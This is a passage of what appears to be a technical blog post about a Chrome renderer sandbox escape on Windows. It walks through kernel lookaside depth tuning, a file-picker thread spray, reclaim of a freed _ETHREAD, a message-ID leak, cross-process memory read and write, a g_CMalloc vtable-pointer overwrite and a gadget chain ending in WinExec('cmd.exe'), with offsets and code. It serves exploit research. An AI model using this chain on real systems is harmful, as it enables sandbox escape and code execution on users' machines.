+<pre><code class="hljs angelscript">mov qword ptr [rbx<span class="hljs-number">-2</span>], <span class="hljs-number">1000000</span>h     ; one <span class="hljs-number">8</span>-byte store <span class="hljs-built_in">int</span>o Buckets[n]+<span class="hljs-number">0x10</span></code></pre>
+<p>Unpack it little-endian and it lands exactly on the fields we saw earlier with <code>dt</code>.</p>
+<pre><code class="hljs angelscript">+<span class="hljs-number">0x10</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span>   &#x2192;  Depth        = <span class="hljs-number">0</span>
++<span class="hljs-number">0x12</span>  <span class="hljs-number">00</span> <span class="hljs-number">01</span>   &#x2192;  MaximumDepth = <span class="hljs-number">0x100</span> (<span class="hljs-number">256</span>)</code></pre>
+<p>The maximum depth is 256, but the starting depth is 0. A freshly initialized bucket caches nothing at all. A freed slab can&#x2019;t land on the SLIST and drops straight into the VS backend&#x2019;s RB-tree. Reclaim can&#x2019;t even get started.</p>
+<p>So when does this <code>Depth</code> actually grow? Tearing apart <code>RtlpLookasideAdjustDepth</code> gives us these rules.</p>
+<pre><code class="hljs nasm">nt!RtlpLookasideAdjustDepth+0x0b:
+  sub    ecx,  [r9+24h]             ; ecx  = allocs in this window
+  ...
+  sub    r10d, [r9+28h]             ; r10d = misses in this window
+  ...
+
++0x3a:
+  movzx  r8d,  word ptr [r9+10h]    ; r8d  = Depth         &#x2190; current allowance
+  cmovbe eax,  r10d                 ; eax  = min(allocs, misses)
+  movzx  r10d, word ptr [r9+12h]    ; r10d = MaximumDepth  &#x2190; maximum depth
+  test   ecx, ecx
+  cmovz  ecx, r11d                  ; allocs 0 &#x2192; 1        &#x2190; divide-by-zero guard
+  imul   eax, eax, 3E8h             ;  &#xD7; 1000
+  div    ecx                        ;  &#x2192; eax = miss rate (per mille)
+  cmp    ecx, 19h                   ; if the previous window had fewer than 25 allocs
+  jb     +0xae                      ;  &#x2192; just shrink it
+
++0x68:
+  cmp    eax, 5                     ; if the miss rate is 0.5% or higher
+  jae    +0x7e                      ;  &#x2192; go grow it
+
++0x6d:
+  sub    r8d, r11d                  ; Depth -= 1
+
++0x70:
+  mov    eax, 4
+  cmp    r8d, eax
+  cmovle r8d, eax                   ; floor 4
+  jmp    +0x2e                      ;  &#x2192; store
+
++0x7e:
+  mov    ecx, r10d
+  sub    ecx, r8d                   ; headroom = MaximumDepth - Depth
+  imul   ecx, eax                   ;  &#xD7; miss rate
+  ...                               ;  ( &#xF7; 1000 )
+  add    edx, 5
+  mov    eax, 1Eh
+  cmovae edx, eax                   ; at most +30 per adjustment
+  lea    eax, [rdx+r8]
+  cmp    eax, r10d
+  mov    r8d, eax
+  cmovge r8d, r10d                  ; up to the maximum depth
+
++0xae:
+  sub    r8d, 0Ah                   ; Depth -= 10
+  jmp    +0x70                      ;  &#x2192; to the floor clamp</code></pre>
+<p><code>r8d</code> is <code>Depth</code> and <code>r10d</code> is <code>MaximumDepth</code>. Follow just those two and the rest reads itself. There are three branches, and the two that shrink all converge on <code>+0x70</code> at the end &#x2014; the <code>-10</code> one even jumps back for it. The <code>cmp r8d, eax</code> / <code>cmovle r8d, eax</code> sitting there is the easiest way to think about why the floor ends up being 4. The branch that grows clamps against the maximum depth on its own and leaves.</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image6.png" srcset="/img/loading.gif" alt="image"></p>
+<pre><code class="hljs apache"><span class="hljs-attribute">fewer</span> than <span class="hljs-number">25</span> allocs in the last window  &#x2192;  Depth -<span class="hljs-number">10</span>
+<span class="hljs-attribute">miss</span> rate below <span class="hljs-number">0</span>.<span class="hljs-number">5</span>%                     &#x2192;  Depth -<span class="hljs-number">1</span>
+<span class="hljs-attribute">otherwise</span>                                &#x2192;  Depth += up to <span class="hljs-number">30</span>
+                                             <span class="hljs-attribute">floor</span> <span class="hljs-number">4</span>, up to MaximumDepth</code></pre>
+<p><code>Depth</code> only grows when misses happen. That means an alloc has to come in against an empty bucket.</p>
+<p>So this <code>Depth</code> isn&#x2019;t the number of items currently held &#x2014; it&#x2019;s an allowance deciding how many will be accepted. The actual count lives separately inside <code>ListHead</code>, and this function never touches the SLIST at all &#x2014; it only edits the allowance number. So when it goes <code>-10</code> above, it doesn&#x2019;t mean cached slabs get thrown away &#x2014; it means the headroom for accepting future ones shrinks.</p>
+<aside>
+&#x1F4A1;
+
+To sum up, this bucket only opens once you convince the kernel that it&apos;s a **&quot;frequently used size&quot;**.
+
+This is exactly why the `prime_lookaside` we&apos;ll see later keeps creating and destroying threads. It isn&apos;t trying to pre-fill the slots &#x2014; it&apos;s **deliberately generating misses to push `Depth` up**.
+
+</aside>
+
+<p>Of course, in practice this ordering does get broken sometimes, and sometimes a completely unrelated allocation snatches the slab I freed first. So now it&#x2019;s time to look at how we stop that, and who we get to take the spot, right?</p>
+<h1 id="2-Taking-the-Slab-Back"><a href="#2-Taking-the-Slab-Back" class="headerlink" title="2. Taking the Slab Back"></a>2. Taking the Slab Back</h1><p>Chapter 1 gave us all the conditions. <strong>An alloc just has to come right after the free, and it doesn&#x2019;t matter if that alloc belongs to somebody else&#x2019;s process.</strong> So now we can actually go do it! &#x2026; is what I thought, but of course it doesn&#x2019;t work.. &#x1F607;</p>
+<h2 id="2-1-Two-Reasons-Reclaim-Doesn&#x2019;t-Just-Work"><a href="#2-1-Two-Reasons-Reclaim-Doesn&#x2019;t-Just-Work" class="headerlink" title="2.1 Two Reasons Reclaim Doesn&#x2019;t Just Work"></a>2.1 Two Reasons Reclaim Doesn&#x2019;t Just Work</h2><blockquote>
+<p><strong>If the bucket isn&#x2019;t warmed up, you can&#x2019;t even start</strong></p>
+</blockquote>
+<p>This is the thing we just saw. If <code>Depth</code> is close to 0, the slab I freed can&#x2019;t get onto the SLIST. It flows straight into the VS backend&#x2019;s RB-tree. At that point LIFO becomes somebody else&#x2019;s story, and nobody knows where the next <code>0xa80</code> allocation will pick anything up from.</p>
+<p>And this doesn&#x2019;t just end in a plain &#x201C;failure&#x201D;. The RB-tree side does best-fit plus coalescing, so the contents of the slab that comes back are completely scrambled. Later the kernel believes that spot is an <code>_ETHREAD</code> and reads a fixed offset (we&#x2019;ll see exactly where in Chapter 3), and if what&#x2019;s sitting there is garbage, the kernel dies right on the spot. So the price of a failed reclaim is, once again, a BSOD..</p>
+<blockquote>
+<p><strong>Somebody else grabs it first</strong></p>
+</blockquote>
+<p>Hard LIFO, flipped around, also means <strong>whoever cuts in line owns it</strong>. If even a single identical <code>0xa80</code> allocation cuts in between the moment I free and the moment the process I want allocates, that slab goes to them.</p>
+<p>The problem is that this &#x201C;somebody else&#x201D; is usually ourselves!!</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image7.png" srcset="/img/loading.gif" alt="image"></p>
+<ul>
+<li>The Chromium renderer creates and destroys threads even when it&#x2019;s sitting idle. Thread pools, IO, Mojo&#x2026; it&#x2019;s all noise.</li>
+<li>Even the <code>prime_lookaside</code> threads I create myself to warm the bucket are competitors.</li>
+</ul>
+<p>What happens if our own renderer takes that spot? The dangling pointer ends up <strong>pointing at itself</strong>. From the kernel&#x2019;s point of view everything works perfectly fine, but we end up reading and writing a renderer that&#x2019;s locked inside the Untrusted IL sandbox. There&#x2019;s no way out.</p>
+<p>To sum up, reclaim has to clear two gates: keeping the bucket open, and making sure the process I want is the one that takes the spot. Let&#x2019;s start with the second. Once we know who fills it, we also know when to warm the bucket &#x2014; so who on earth is going to create threads on my behalf?</p>
+<h2 id="2-2-Thread-Spray-via-the-File-Picker"><a href="#2-2-Thread-Spray-via-the-File-Picker" class="headerlink" title="2.2 Thread Spray via the File Picker"></a>2.2 Thread Spray via the File Picker</h2><p>There was only one thing we needed: a Medium IL process that creates threads on our timing!</p>
+<p>But we&#x2019;re locked inside an Untrusted IL renderer. There&#x2019;s no way to tell somebody else&#x2019;s process &#x201C;hey, make me a thread&#x201D;. If such a way exists, it can only be a path Chrome itself was built to take, right? And that path is the file picker!</p>
+<pre><code class="hljs jsx"><span class="hljs-keyword">await</span> <span class="hljs-built_in">window</span>.showOpenFilePicker();</code></pre>
+<p>With this one line, the renderer calls <code>UtilWin::CallExecuteSelectFile</code> over Mojo, and the browser spawns a separate process called util_win. Look at the command line and you&#x2019;ll immediately see why this is our target.</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image8.png" srcset="/img/loading.gif" alt="image"></p>
+<pre><code class="hljs fsharp">--utility-sub-<span class="hljs-class"><span class="hljs-keyword">type</span></span>=chrome.mojom.UtilWin
+--service-sandbox-<span class="hljs-class"><span class="hljs-keyword">type</span></span>=none</code></pre>
+<p><strong>There is no sandbox at all.</strong> And it&#x2019;s Medium IL. In Step 4, OUYA77 showed us how Chrome locks itself down, but the file picker alone has to load shell extensions and COM, so it simply couldn&#x2019;t be locked down&#x2026;!! (ba dum tss)</p>
+<p>And what util_win does is <code>CoCreateInstance(CLSID_FileOpenDialog)</code>. The moment COM is initialized as an STA, combase and rpcrt4 spin up thread pools and RPC threads all at once. With a single picker call, <code>_ETHREAD</code> objects get freshly allocated &#x2014; 8~16 of them.</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image9.png" srcset="/img/loading.gif" alt="image"></p>
+<p>That one line we mentioned back in 1.1 pays off right here. One <code>NtCreateThreadEx</code> equals one <code>0xa80</code>. With a single line of JS, we make somebody else&#x2019;s Medium IL process allocate our size class in bulk!</p>
+<p>That said, not just any thread will do. During the first few ms of the file picker being created, what gets made are the ntdll parallel loader&#x2019;s worker threads, and these guys <strong>die the instant loading finishes.</strong> And on their way out they free the slab we worked so hard to feed them. It&#x2019;s like reclaiming it and then spitting it right back out.. &#x1F92E;</p>
+<p>The window we&#x2019;re after is <strong>the COM initialization burst</strong>. It arrives tens to hundreds of ms after the dialog request goes in. And the threads created here stay alive the whole time the dialog is open. Also, what we&#x2019;re after isn&#x2019;t &#x201C;any allocation of size <code>0xa80</code>&#x201C; &#x2014; it has to be <strong>a real thread</strong>. The kernel believes that spot is an <code>_ETHREAD</code> and reads a fixed offset. If some other object that merely matches in size sits there, the value inside is garbage &#x2014; and the moment the kernel grabs that as a process, we&#x2019;d hit another BSOD, right?</p>
+<p>This is exactly why the file picker makes such a good spray primitive. <strong>It calls a real <code>CreateThread</code> on our behalf!</strong></p>
+<h2 id="2-3-prime-lookaside-SELF-CHECK-filtering"><a href="#2-3-prime-lookaside-SELF-CHECK-filtering" class="headerlink" title="2.3 prime_lookaside, SELF-CHECK filtering"></a>2.3 prime_lookaside, SELF-CHECK filtering</h2><p>One gate left, right? Keeping the bucket open!</p>
+<p>But 1.2 already gave us the answer. <code>Depth</code> only grows when misses happen, remember? So we generate misses on purpose. Repeatedly creating and destroying threads keeps triggering <code>0xa80</code> allocations, and every alloc against an empty bucket piles on another miss. That is <code>prime_lookaside</code>.</p>
+<p>That said, <strong>don&#x2019;t make too many.</strong> Remember the second reason from 2.1? The threads I create are competitors too. Run too many and I end up grabbing my own slab back. After a lot of trial and error, I settled on 8 as the optimal number.</p>
+<p>The sequence goes like this.</p>
+<ol>
+<li>prime_lookaside(8) - open the bucket</li>
+<li>showOpenFilePicker() - thread spray via util_win</li>
+<li>WorkerThread exits - _ETHREAD free</li>
+<li>short wait - leave room for somebody to move into the spot</li>
+<li><del>but how do we know who that somebody is?</del></li>
+</ol>
+<p>That last line is the problem. Reclaim happens quietly inside the kernel, and nobody tells you whether it succeeded. Move on to the next step without knowing, and you may pay for it later&#x2026; In fact, on my first attempt I went &#x201C;huh? reclaim seems to be working fine? isn&#x2019;t this easy?&#x201D; and lived to regret it..&#x1F62D;</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image10.png" srcset="/img/loading.gif" alt="image"></p>
+<p>So I decided to verify it. As it happens, combase has exactly the right value for this: <code>g_CMalloc</code> &#x2014; the allocator object COM goes through every time it takes and releases memory, and its first 8 bytes are a <code>CRetailMalloc</code> vtable pointer. If the reclaim worked, we should be able to read the memory of whichever process took that spot &#x2014; so let&#x2019;s just read <code>[g_CMalloc]</code>. If a genuine <code>CRetailMalloc</code> vtable address is sitting there &#x2014; let&#x2019;s call this <code>WANT</code> &#x2014; then it means a healthy process with combase loaded has taken that spot. The address really was sitting there, so naturally I believed the reclaim had gone well&#x2026; for a very short while, anyway..</p>
+<p>I attached kd and looked directly at my own renderer, and that&#x2019;s where I found the problem.</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image11.png" srcset="/img/loading.gif" alt="image"></p>
+<pre><code class="hljs awk">rendere<span class="hljs-string">r&apos;s [g_CMalloc]  =  WANT</span>
+<span class="hljs-string">util_win&apos;</span>s [g_CMalloc]  =  WANT</code></pre>
+<p>They&#x2019;re the same value. Which makes sense when you think about it &#x2014; the same combase is loaded in the renderer too. So getting <code>WANT</code> back didn&#x2019;t mean &#x201C;reclaim succeeded&#x201D;; it only meant <strong>&#x201C;the kernel read somewhere and brought back a value&#x201D;</strong> &#x2014; and that somewhere could have been util_win, or just my own renderer.</p>
+<p>If the reclaim is late and my own renderer takes the spot, the gate reads that as success and marches right on. And inside Untrusted IL, <code>WinExec</code> is blocked, so cmd would never show up..?</p>
+<p>So how on earth do we tell these two apart?? While mulling it over, this approach came to me. I embedded an 8-byte <code>CTRL_MAGIC</code> into the CTRL structure the exploit DLL uses, and prepared one more entry that reads that address. This becomes a value that exists only in my renderer&#x2019;s address space!!</p>
+<ul>
+<li>my renderer took it &#x2192; that address is mapped, and <strong>the magic comes right back</strong></li>
+<li>util_win took it &#x2192; that address is unmapped on their side &#x2192; <strong>the magic never comes back!!</strong></li>
+</ul>
+<p>So we make it two gates instead of one!!</p>
+<pre><code class="hljs applescript">[g_CMalloc] == WANT        a live combase process has taken <span class="hljs-keyword">the</span> spot..!
+        AND
+[ctrl] != CTRL_MAGIC       <span class="hljs-keyword">but</span> <span class="hljs-keyword">it</span> <span class="hljs-keyword">isn&apos;t</span> <span class="hljs-keyword">me</span>??</code></pre>
+<p>So we only proceed when both gates pass, and if the magic comes back we throw that process away and wait again hehe &#x270C;&#xFE0F;</p>
+<h1 id="3-Reading-Across-Processes"><a href="#3-Reading-Across-Processes" class="headerlink" title="3. Reading Across Processes"></a>3. Reading Across Processes</h1><h2 id="3-1-LPCP-DATA-INFO-cross-process-R-W"><a href="#3-1-LPCP-DATA-INFO-cross-process-R-W" class="headerlink" title="3.1 LPCP_DATA_INFO - cross-process R/W"></a>3.1 LPCP_DATA_INFO - cross-process R/W</h2><p>Now that we can even confirm whether the reclaim happened, it&#x2019;s finally time to actually read and write memory!!! But we get stuck again right here <del>(how many times are we going to get stuck!!)</del>. I&#x2019;m currently an Untrusted IL renderer. I can&#x2019;t grab a util_win handle with <code>OpenProcess</code>, and I can&#x2019;t call <code>ReadProcessMemory</code> either. <strong>There&#x2019;s no way to touch somebody else&#x2019;s address space directly.</strong></p>
+<p>So instead of doing it ourselves, we make the kernel do it for us! This is where the vulnerability we covered back in Step 5 really shines!!</p>
+<pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS <span class="hljs-title">NtReadRequestData</span><span class="hljs-params">(</span></span>
+<span class="hljs-function"><span class="hljs-params">    HANDLE        PortHandle,</span></span>
+<span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE Message,         <span class="hljs-comment">// the kernel finds the message in the queue by the MessageId inside this</span></span></span>
+<span class="hljs-function"><span class="hljs-params">    ULONG         DataEntryIndex,  <span class="hljs-comment">// which index into LPCP_DATA_INFO.Entries[]</span></span></span>
+<span class="hljs-function"><span class="hljs-params">    PVOID         LocalBuffer,     <span class="hljs-comment">// our own buffer</span></span></span>
+<span class="hljs-function"><span class="hljs-params">    SIZE_T        Length,</span></span>
+<span class="hljs-function"><span class="hljs-params">    PSIZE_T       ReturnLength</span></span>
+<span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre>
+<p><code>NtWriteRequestData</code> has exactly the same signature. Only the direction is reversed!</p>
+<pre><code class="hljs arduino">NtReadRequestData    target <span class="hljs-built_in">process</span>[Entries[i].BaseAddress]  &#x2192;  our <span class="hljs-built_in">buffer</span>
+NtWriteRequestData   our <span class="hljs-built_in">buffer</span>  &#x2192;  target <span class="hljs-built_in">process</span>[Entries[i].BaseAddress]</code></pre>
+<p>Which process the &#x201C;target process&#x201D; actually is isn&#x2019;t something I decide &#x2014; the kernel decides on its own. And how it decides is exactly the story I put off back in 2.1.</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image12.png" srcset="/img/loading.gif" alt="image"></p>
+<p><code>LpcpCopyRequestData</code> &#x2014; traced step by step, this is what it does.</p>
+<ol>
+<li>Find the message in the port queue using Message&#x2019;s MessageId.</li>
+<li>msg + 0x20  &#x2192;  WaitingThread   &#x2190; the _ETHREAD we freed</li>
+<li>[WaitingThread + 0x220]  &#x2192;  Process   &#x2190; that thread&#x2019;s owning process</li>
+<li>Attach to that process and copy</li>
+</ol>
+<p>The <code>WaitingThread</code> in step 2 is that dangling pointer we created back in Step 5, and the <code>+0x220</code> in step 3 is the offset I meant back in 2.1 when I said &#x201C;the kernel reads a fixed offset&#x201D;.</p>
+<pre><code class="hljs nasm">nt!LpcpCopyRequestData+0x1aa:
+  mov  rax, qword ptr [rsp+48h]     ; the message we found
+  mov  r9,  qword ptr [rax+20h]     ; msg + 0x20  =  WaitingThread
+  test r9, r9
+  jne  ...</code></pre>
+<p>The second line is exactly where that dangling pointer gets pulled out. And what comes right after is a single <code>test r9, r9</code>. <strong>It only checks for NULL &#x2014; it never checks whether that&#x2019;s actually a live thread.</strong> This is precisely the crack we dig into.</p>
+<pre><code class="hljs nasm">nt!LpcpCopyRequestData+0x270:
+  mov  rcx, qword ptr [r8+0B8h]     ; our process
+  mov  r8,  qword ptr [r9+220h]     ; WaitingThread + 0x220  =  target process
+  mov  r9,  qword ptr [rsp+60h]     ; the entry&apos;s BaseAddress
+  mov  rdx, qword ptr [rsp+0E0h]    ; our buffer
+
+nt!LpcpCopyRequestData+0x28d:
+  mov  r8,  qword ptr [r8+0B8h]     ; our process
+  mov  rcx, qword ptr [r9+220h]     ; target process
+  mov  r9,  qword ptr [rsp+0E0h]    ; our buffer
+  mov  rdx, qword ptr [rsp+60h]     ; the entry&apos;s BaseAddress
+
+nt!LpcpCopyRequestData+0x2a8:
+  call nt!MiCopyVirtualMemory</code></pre>
+<p>You can see there are two blocks, right? And they&#x2019;re perfectly symmetric. Unpacking them as <code>MiCopyVirtualMemory(From, FromAddr, To, ToAddr, &#x2026;)</code> gives us this.</p>
+<pre><code class="hljs arduino">+<span class="hljs-number">0x270</span>    our <span class="hljs-built_in">buffer</span>      &#x2192;  target <span class="hljs-built_in">process</span>   =  Write
++<span class="hljs-number">0x28d</span>    target <span class="hljs-built_in">process</span>  &#x2192;  our <span class="hljs-built_in">buffer</span>       =  Read</code></pre>
+<p>And what splits these two is a single byte, <code>cl</code>, taken at the very top of the function. Read or write, <strong>they both end up entering the same function, and only one flag decides the direction</strong>!</p>
+<p>Originally this slot pointed at the thread that sent the message &#x2014; that is, the renderer. The moment we kill that thread and util_win reclaims the spot, that very same pointer points at <strong>a live thread inside util_win</strong>. The kernel doesn&#x2019;t think anything is off. It just attaches to util_win as told and copies away!! &#x1F929;</p>
+<p>That said, two constraints come attached.</p>
+<blockquote>
+<p><strong>Writes only work on writable pages</strong></p>
+</blockquote>
+<p>The kernel validates addresses against UserMode. Reading works on <code>.text</code> or <code>.rdata</code> alike, but writing requires a page that is writable at runtime. This becomes the decisive constraint when we pick &#x201C;what to overwrite&#x201D; in Chapter 4.</p>
+<blockquote>
+<p><strong>The addresses to read and write must be decided up front</strong></p>
+</blockquote>
+<p>The entry&#x2019;s <code>BaseAddress</code> gets copied to the kernel&#x2019;s own side at the moment the message is sent. Changing the value in our buffer afterwards does nothing. So &#x201C;let&#x2019;s reclaim first and decide the addresses later&#x201D; simply isn&#x2019;t an option. <strong>Everything about where we&#x2019;ll read and write has to be decided before we pull the trigger..!!</strong></p>
+<h2 id="3-2-Message-ID-leak"><a href="#3-2-Message-ID-leak" class="headerlink" title="3.2 Message ID leak"></a>3.2 Message ID leak</h2><p>3.1 built all the tools. But to call <code>NtReadRequestData</code>, we needed one more argument. That would be <code>PPORT_MESSAGE Message</code>!</p>
+<p>The kernel doesn&#x2019;t use that buffer as data. <strong>It uses the <code>MessageId</code> inside it to find the message in the port queue.</strong></p>
+<pre><code class="hljs vbnet">we don<span class="hljs-comment">&apos;t know the Message ID  &#x2192;  the kernel can&apos;t find the message  &#x2192;  the call itself fails</span></code></pre>
+<p>In effect, no matter how well the reclaim goes, if we can&#x2019;t point at that message we can&#x2019;t do anything. The problem is that we don&#x2019;t get to choose the MID &#x2014; it&#x2019;s a handle the kernel issues itself when it puts the message on the queue. Not a counter that climbs in order, but a value whose upper bits select a table and whose remainder is an index, so there is no guessing it. And the thread that sent that message? We killed it with our own hands to create the UAF.</p>
+<p>So for a while I thought this was impossible&#x2026; Digging into the kernel&#x2019;s lookup path, it splits that handle apart, pulls the message out of a global table, and the <code>MessageId</code> on the message it pulled has to match the value we handed in exactly. &#x1F50D;</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image13.png" srcset="/img/loading.gif" alt="image"></p>
+<p>But I was mistaken. There was no need to invent a MID at all..? If you call <code>NtAlpcSendWaitReceivePort</code> on the same port in <strong>receive-only, no-send</strong> mode, the kernel hands the message sitting on the queue right back into our buffer. And the <code>MessageId</code> the kernel assigned will be sitting right there, won&#x2019;t it?</p>
+<pre><code class="hljs cpp">BYTE* recvBuf = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, ...);
+ULONG recvLen = <span class="hljs-number">0x200</span>;
+LARGE_INTEGER timeout; timeout.QuadPart = <span class="hljs-number">0</span>;
+
+NtAlpcSendWaitReceivePort(hPort, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>,
+                          recvBuf, &amp;recvLen, <span class="hljs-literal">NULL</span>, &amp;timeout);
+
+ULONG mid = *(ULONG*)(recvBuf + <span class="hljs-number">0x18</span>);   <span class="hljs-comment">// &#x2190; right here</span></code></pre>
+<p>Printing it for real gives us this.</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">st_recv</span>       = <span class="hljs-number">0</span> (SUCCESS)
+<span class="hljs-attribute">recvLen</span>       = <span class="hljs-number">0</span>x<span class="hljs-number">200</span>
+<span class="hljs-attribute">recvBuf</span>[<span class="hljs-number">0</span>x<span class="hljs-number">18</span>] = <span class="hljs-number">0</span>x<span class="hljs-number">0</span>b<span class="hljs-number">18</span>      &#x2190; MID leak!</code></pre>
+<p>No need to break the condition &#x2014; <strong>we simply received a number that already satisfies it.</strong> After all, it&#x2019;s a value the kernel issued itself!</p>
+<p>And we can hand this <code>recvBuf</code> straight to <code>NtReadRequestData</code> / <code>NtWriteRequestData</code> as the <code>Message</code> argument. The kernel reads the MID inside it on its own. In this state both reads and writes come back SUCCESS, and whatever we write reads back exactly as written. <strong>We can finally read and write the memory of a Medium process!!</strong> &#x1F389;</p>
+<p>But one thing here &#x2014; how did we know the addresses to read and write in the first place? Normally a chain like this starts with a base leak, right?</p>
+<p>The hint came from the very place we got stuck earlier: <code>ntdll</code> &#xB7; <code>combase</code> &#xB7; <code>kernel32</code> are all KnownDLLs, so within a single boot they load at the same address even in different processes. <code>chrome.dll</code> is the same image too, so it&#x2019;s no different. Which means that if we call <code>GetModuleHandleA</code> once in our renderer, <strong>that value holds in util_win too, exactly as-is!!</strong></p>
+<p>We do exactly the same thing in the later exploitation steps. Even the fake vtable we&#x2019;ll build later is a copy of the real <code>CRetailMalloc</code> vtable, <strong>read straight out of our own renderer&#x2019;s combase</strong>!!</p>
+<h1 id="4-Hijacking-Execution"><a href="#4-Hijacking-Execution" class="headerlink" title="4. Hijacking Execution"></a>4. Hijacking Execution</h1><h2 id="4-1-vtable-pointer-overwrite"><a href="#4-1-vtable-pointer-overwrite" class="headerlink" title="4.1 vtable pointer overwrite"></a>4.1 vtable pointer overwrite</h2><p>Now that we can read and write, it&#x2019;s time to overwrite. But there was one problem left over from 3.1, remember? <strong>Writes only work on writable pages!</strong></p>
+<pre><code class="hljs pgsql">KCT (Kernel Callback <span class="hljs-keyword">Table</span>)   &#x2192;  .rdata    <span class="hljs-keyword">read</span>-<span class="hljs-keyword">only</span>
+__guard_check_icall_fptr      &#x2192;  .mrdata   <span class="hljs-keyword">read</span>-<span class="hljs-keyword">only</span>
+__guard_dispatch_icall_fptr   &#x2192;  <span class="hljs-number">.00</span>cfg    <span class="hljs-keyword">read</span>-<span class="hljs-keyword">only</span></code></pre>
+<p>Reversing it myself, the only thing we can touch is <code>.data</code>, which is writable at runtime. So I had to flip the question around. Not &#x201C;what would be nice to overwrite&#x201D;, but <strong>&#x201C;is there anything that lives in .data and holds the execution flow?&#x201D;</strong></p>
+<p>The answer had been in our hands all along. That same <code>g_CMalloc</code> we read back in 2.3 to confirm the reclaim!! And here&#x2019;s the important part: <strong>what we need to overwrite is not the vtable.</strong></p>
+<pre><code class="hljs apache"><span class="hljs-attribute">CRetailMallocVtbl</span>   combase + <span class="hljs-number">0</span>x<span class="hljs-number">28</span>a<span class="hljs-number">5</span>f<span class="hljs-number">0</span>   &#x2192;  .rdata   not one byte writable
+<span class="hljs-attribute">g_CMalloc</span>           combase + <span class="hljs-number">0</span>x<span class="hljs-number">338348</span>   &#x2192;  .data    writable</code></pre>
+<p>The table itself, that row of function pointers, is read-only &#x2014; we can&#x2019;t lay a finger on it. But the object instance pointing at that table lives in <code>.data</code>. So instead of fixing the table, we <strong>make the object look at a different table</strong>.</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image14.png" srcset="/img/loading.gif" alt="image"></p>
+<p>So, in a free spot inside ntdll&#x2019;s <code>.data</code>, we&#x2019;ll build one fake vtable <code>S</code>, and change the first 8 bytes of <code>g_CMalloc</code> so that they point at it. <code>S</code> is built by <strong>copying the real vtable wholesale</strong>. As I mentioned in 3.2, combase is a KnownDLL, so we can simply read the <code>CRetailMallocVtbl</code> that&#x2019;s loaded in my own renderer. After that we only swap out the slots we need!</p>
+<p>It&#x2019;s important to leave slots 0~2 (<code>QueryInterface</code> / <code>AddRef</code> / <code>Release</code>) real. COM keeps calling them in between allocations, and if they jump somewhere wrong the process just dies. &#x1F480;</p>
+<p>Finally, there&#x2019;s one more reason <code>g_CMalloc</code> is such a good target: I don&#x2019;t have to build a trigger myself. Just overwrite it and util_win steps on it all by itself. As the file dialog initializes, COM takes and releases memory dozens of times. All we have to do is arm it and wait! &#x1F60E;</p>
+<p>And we don&#x2019;t even have to wait on one particular slot. The very first allocation after entry is enough to fire the trigger!</p>
+<h2 id="4-2-Gadget-Chaining"><a href="#4-2-Gadget-Chaining" class="headerlink" title="4.2 Gadget Chaining"></a>4.2 Gadget Chaining</h2><p><code>g_CMalloc</code> now looks at <code>S</code>, so the moment util_win next takes memory, <code>S[3]</code> gets called. So what do we put in there to reach code execution? We can&#x2019;t simply drop <code>WinExec</code> in. At that moment <code>rcx</code> is <code>&amp;g_CMalloc</code>. It&#x2019;s a C++ method call, so the first argument is always <code>this</code>. But the first argument of <code>WinExec(lpCmdLine, uCmdShow)</code> has to be a string&#x2026;</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image15.png" srcset="/img/loading.gif" alt="image"></p>
+<p>So <strong><code>rcx</code> needs stepping stones to get swapped out</strong>. The first gadget calls the next one, and the second gadget is where <code>rcx</code> gets swapped:</p>
+<pre><code class="hljs x86asm">G1              ntdll  + <span class="hljs-number">0xa36f0</span>
+  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rcx</span>+<span class="hljs-number">0x20</span>]
+  <span class="hljs-keyword">call</span> <span class="hljs-built_in">rax</span>
+
+chrome gadget   chrome + <span class="hljs-number">0x556235c</span>
+  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rcx</span>+<span class="hljs-number">0x30</span>]
+  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rcx</span>+<span class="hljs-number">0x10</span>]
+  <span class="hljs-keyword">call</span> [__guard_dispatch_icall_fptr]</code></pre>
+<p><code>G1</code>, as you can see, leaves <code>rcx</code> untouched and calls <code>[rcx+0x20]</code>. Since <code>rcx</code> is <code>&amp;g_CMalloc</code>, that means calling <code>[g_CMalloc+0x20]</code>. That&#x2019;s where we plant the second gadget.</p>
+<p>The second gadget is the real deal: <code>mov rcx, [rcx+0x30]</code> swaps <strong><code>rcx</code></strong> out! <code>[g_CMalloc+0x30]</code> holds the <code>&amp;SCR_obj</code> that I put there.</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">SCR_obj</span> + <span class="hljs-number">0</span>x<span class="hljs-number">00</span>   <span class="hljs-string">&quot;cmd.exe&quot;</span>
+<span class="hljs-attribute">SCR_obj</span> + <span class="hljs-number">0</span>x<span class="hljs-number">10</span>   kernel<span class="hljs-number">32</span>!WinExec</code></pre>
+<p>And the very next line is <code>mov rax, [rcx+0x10]</code>. Since <code>rcx</code> just became <code>&amp;SCR_obj</code>, <code>rax</code> receives <code>WinExec</code>, and <code>rcx</code> stays <code>&amp;SCR_obj</code> &#x2014; that is, the address of the <strong><code>&quot;cmd.exe&quot;</code></strong> string &#x2014; so at the very last moment it gets swapped in as the first argument of <code>WinExec</code>.</p>
+<pre><code class="hljs dts">rcx :  <span class="hljs-variable">&amp;</span>g_CMalloc  &#x2192;  <span class="hljs-variable">&amp;</span>g_CMalloc  &#x2192;  <span class="hljs-variable">&amp;</span>SCR_obj</code></pre>
